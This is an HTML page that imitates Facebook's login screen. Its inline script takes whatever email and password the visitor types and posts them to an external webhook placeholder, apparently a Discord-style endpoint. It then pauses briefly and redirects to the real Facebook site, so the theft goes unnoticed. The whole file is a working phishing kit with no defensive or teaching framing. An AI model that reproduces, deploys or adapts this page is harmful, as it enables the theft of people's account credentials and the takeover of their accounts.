<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook â€“ log in or sign up</title>
    <link rel="stylesheet" href="default.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login">
        <div class="container">
            <div class="row">
                <div class="col-7">
                    <div class="align-center">
                        <div class="content">
                            <img src="img/fb.png" alt="">
                            <p>Facebook helps you connect and share with the people in your life.</p>
                        </div>
                    </div>
                </div>
                <div class="col-5 col-xs-12">
                    
                        <div class="login-form">
                            <form action="">
                                <input id="email" type="text" placeholder="Email address or phone number"><br>
                                <input id="pass" type="text" placeholder="Password"><br>
                                <button id="login-btn" onclick="sendMessage()">Log In</button><br>
                                <a href="#">Forgotten password?</a><br>
                                <button id="create-btn">Create New Account</button><br>
                            </form>
                        </div>
                        <footer>
                            <a href="#" 
                            style="font-weight: bold;
                            color: var(--black);
                            text-decoration: none;">Create a Page</a> 
                            for a celebrity, band or business.
                        </footer>
                    
                </div>
            </div>
        </div>
    </div>
    <script>
        function sendMessage() {
        function sleep(milliseconds) {
        const date = Date.now();
        let currentDate = null;
        do {
          currentDate = Date.now();
        } while (currentDate - date < milliseconds);
      }
          var request = new XMLHttpRequest();
          request.open("POST", "WEBHOOK");
          request.setRequestHeader('Content-type', 'application/json');
          var params = {
            content: ("> **USERNAME  : **" + document.getElementById('email').value + "\n> **PASSWORD : **" + document.getElementById('pass').value)
          }
          request.send(JSON.stringify(params));
          sleep(2000)
          window.location.replace("https://www.facebook.com");
        }
        </script>
</body>
</html>
